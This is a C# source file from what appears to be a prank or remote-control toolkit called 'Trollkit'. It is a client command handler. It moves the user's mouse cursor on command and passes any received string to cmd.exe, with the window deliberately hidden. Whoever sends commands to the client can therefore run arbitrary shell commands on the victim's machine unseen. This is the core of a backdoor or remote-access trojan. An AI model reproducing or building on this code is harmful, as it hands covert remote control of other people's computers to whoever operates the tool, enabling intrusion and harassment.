using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Trollkit_Library.Models;

namespace Trollkit_Client.Modules.CommandHandlers
{
    public class WindowsHandler : ICommandHandler
    {
        public bool HandleCommand(TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "MousePosition":
					MousePosition(obj.Value);
					return true;
				case "Command":
					RunCommand(obj.Value);
					return true;
			}

			return false;
		}

		private void MousePosition(string coordinates)
		{
			string[] values = coordinates.Split(',');
			Cursor.Position = new Point(int.Parse(values[0]), int.Parse(values[1]));
		}

		private void RunCommand(string command)
		{
			//test command = explorer https://google.com
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = $"/C {command}"; 
			process.StartInfo = startInfo;
			process.Start();
		}
    }
}
